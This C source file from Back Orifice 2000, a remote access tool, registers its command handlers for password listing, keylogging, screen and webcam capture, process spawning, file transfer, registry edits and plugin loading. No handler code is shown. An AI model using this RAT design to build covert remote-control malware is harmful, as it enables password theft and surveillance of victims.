/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// Native Back Orifice Commands

#include<windows.h>
#include<bocomreg.h>
#include<comm_native.h>
#include<iohandler.h>
#include<cmd\cmd_simple.h>
#include<cmd\cmd_system.h>
#include<cmd\cmd_gui.h>
#include<cmd\cmd_tcpip.h>
#include<cmd\cmd_msnet.h>
#include<cmd\cmd_process.h>
#include<cmd\cmd_registry.h>
#include<cmd\cmd_multimedia.h>
#include<cmd\cmd_file.h>
#include<cmd\cmd_resolver.h>
#include<cmd\cmd_compress.h>
#include<cmd\cmd_keylogging.h>
#include<cmd\cmd_serverctrl.h>
#include<cmd\cmd_plugin.h>

int RegisterNativeCommands(void)
{

	// Simple commands (MUST BE HERE, DO NOT UNREGISTER UNLESS YOU KNOW WHAT YOU ARE DOING!)
	RegisterNativeCommand(BO_PING,CmdProc_Ping);
	RegisterNativeCommand(BO_QUERY,CmdProc_Query);

	// System Commands
	
	RegisterNativeCommand(BO_SYSREBOOT,CmdProc_SysReboot);
	RegisterNativeCommand(BO_SYSLOCKUP,CmdProc_SysLockup);
	RegisterNativeCommand(BO_SYSLISTPASSWORDS,CmdProc_SysListPasswords);
//	RegisterNativeCommand(BO_SYSVIEWCONSOLE,CmdProc_SysViewConsole);
	RegisterNativeCommand(BO_SYSINFO,CmdProc_SysInfo);

	// Key Logging

	RegisterNativeCommand(BO_SYSLOGKEYS,CmdProc_SysLogKeys);
	RegisterNativeCommand(BO_SYSENDKEYLOG,CmdProc_SysEndKeyLog);
	RegisterNativeCommand(BO_SYSLOGVIEW,CmdProc_FileView);
	RegisterNativeCommand(BO_SYSLOGDELETE,CmdProc_FileDelete);
	
	// GUI Commandszz
	RegisterNativeCommand(BO_SYSMESSAGEBOX,CmdProc_SysMessageBox);
		
	// TCP/IP

	RegisterNativeCommand(BO_REDIRADD,CmdProc_RedirAdd);
	RegisterNativeCommand(BO_APPADD,CmdProc_AppAdd);
	RegisterNativeCommand(BO_HTTPENABLE,CmdProc_HTTPEnable);
	RegisterNativeCommand(BO_TCPFILERECEIVE,CmdProc_TCPFileReceive);
	RegisterNativeCommand(BO_PORTLIST,CmdProc_PortList);
	RegisterNativeCommand(BO_PORTDEL,CmdProc_PortDel);
	RegisterNativeCommand(BO_TCPFILESEND,CmdProc_TCPFileSend);
	
	// M$ Networking Commands
	
	RegisterNativeCommand(BO_NETEXPORTADD,CmdProc_NetExportAdd);
	RegisterNativeCommand(BO_NETEXPORTDELETE,CmdProc_NetExportDelete);
	RegisterNativeCommand(BO_NETEXPORTLIST,CmdProc_NetExportList);
	RegisterNativeCommand(BO_NETVIEW,CmdProc_NetView);
	RegisterNativeCommand(BO_NETUSE,CmdProc_NetUse);
	RegisterNativeCommand(BO_NETDELETE,CmdProc_NetDelete);
	RegisterNativeCommand(BO_NETCONNECTIONS,CmdProc_NetConnections);
	
	// Process Handling
	
	RegisterNativeCommand(BO_PROCESSLIST,CmdProc_ProcessList);
	RegisterNativeCommand(BO_PROCESSKILL,CmdProc_ProcessKill);
	RegisterNativeCommand(BO_PROCESSSPAWN,CmdProc_ProcessSpawn);
	
	// Registry Management
	
	RegisterNativeCommand(BO_REGISTRYCREATEKEY,CmdProc_RegCreateKey);
	RegisterNativeCommand(BO_REGISTRYSETVALUE,CmdProc_RegSetValue);
	RegisterNativeCommand(BO_REGISTRYGETVALUE,CmdProc_RegGetValue);
	RegisterNativeCommand(BO_REGISTRYDELETEKEY,CmdProc_RegDeleteKey);
	RegisterNativeCommand(BO_REGISTRYDELETEVALUE,CmdProc_RegDeleteValue);
	RegisterNativeCommand(BO_REGISTRYRENAMEKEY,CmdProc_RegRenameKey);
	RegisterNativeCommand(BO_REGISTRYRENAMEVALUE,CmdProc_RegRenameValue);
	RegisterNativeCommand(BO_REGISTRYENUMKEYS,CmdProc_RegEnumKeys);
	RegisterNativeCommand(BO_REGISTRYENUMVALS,CmdProc_RegEnumValues);
	
	// Multimedia Controls 
	
	RegisterNativeCommand(BO_MMCAPFRAME,CmdProc_MMCapFrame);
	RegisterNativeCommand(BO_MMCAPAVI,CmdProc_MMCapAVI);
	RegisterNativeCommand(BO_MMPLAYSOUND,CmdProc_MMPlaySound);
	RegisterNativeCommand(BO_MMLOOPSOUND,CmdProc_MMLoopSound);
	RegisterNativeCommand(BO_MMSTOPSOUND,CmdProc_MMStopSound);
	RegisterNativeCommand(BO_MMLISTCAPS,CmdProc_MMListCaps);
	RegisterNativeCommand(BO_MMCAPSCREEN,CmdProc_MMCapScreen);
	
	// File and Directory Commands
	
	RegisterNativeCommand(BO_DIRECTORYLIST,CmdProc_DirectoryList);
	RegisterNativeCommand(BO_FILEFIND,CmdProc_FileFind);
	RegisterNativeCommand(BO_FILEDELETE,CmdProc_FileDelete);
	RegisterNativeCommand(BO_FILEVIEW,CmdProc_FileView);
	RegisterNativeCommand(BO_FILERENAME,CmdProc_FileRename);
	RegisterNativeCommand(BO_FILECOPY,CmdProc_FileCopy);
	RegisterNativeCommand(BO_DIRECTORYMAKE,CmdProc_DirectoryMake);
	RegisterNativeCommand(BO_DIRECTORYDELETE,CmdProc_DirectoryDelete);
	RegisterNativeCommand(BO_SETFILEATTR,CmdProc_SetFileAttr);
	RegisterNativeCommand(BO_RECEIVEFILE,CmdProc_ReceiveFile);
	RegisterNativeCommand(BO_SENDFILE,CmdProc_SendFile);
	RegisterNativeCommand(BO_EMITFILE,CmdProc_EmitFile);
	RegisterNativeCommand(BO_LISTTRANSFERS,CmdProc_ListTransfers);
	RegisterNativeCommand(BO_CANCELTRANSFER,CmdProc_CancelTransfer);

	// File Compression
		
	RegisterNativeCommand(BO_FILEFREEZE,CmdProc_FreezeFile);
	RegisterNativeCommand(BO_FILEMELT,CmdProc_MeltFile);
		
	// Resolver
	
	RegisterNativeCommand(BO_RESOLVEHOST,CmdProc_ResolveHost);
	RegisterNativeCommand(BO_RESOLVEADDR,CmdProc_ResolveAddr);
	
	// Server Control

	RegisterNativeCommand(BO_SHUTDOWNSERVER,CmdProc_ShutdownServer);
	RegisterNativeCommand(BO_RESTARTSERVER,CmdProc_RestartServer);
	RegisterNativeCommand(BO_LOADPLUGINDLL,CmdProc_LoadPluginDll);
	RegisterNativeCommand(BO_DEBUGPLUGINDLL,CmdProc_DebugPluginDll);
	RegisterNativeCommand(BO_LISTPLUGINDLLS,CmdProc_ListPluginDlls);
	RegisterNativeCommand(BO_REMOVEPLUGINDLL,CmdProc_RemovePluginDll);
	RegisterNativeCommand(BO_STARTCOMMANDSOCKET,CmdProc_StartCommandSocket);
	RegisterNativeCommand(BO_LISTCOMMANDSOCKETS,CmdProc_ListCommandSockets);
	RegisterNativeCommand(BO_STOPCOMMANDSOCKET,CmdProc_StopCommandSocket);

	// Legacy Plugin interface
	
	RegisterNativeCommand(BO_PLUGINEXECUTE,CmdProc_PluginExecute);
	RegisterNativeCommand(BO_PLUGINLIST,CmdProc_PluginList);
	RegisterNativeCommand(BO_PLUGINKILL,CmdProc_PluginKill);
	
	return 0;
}

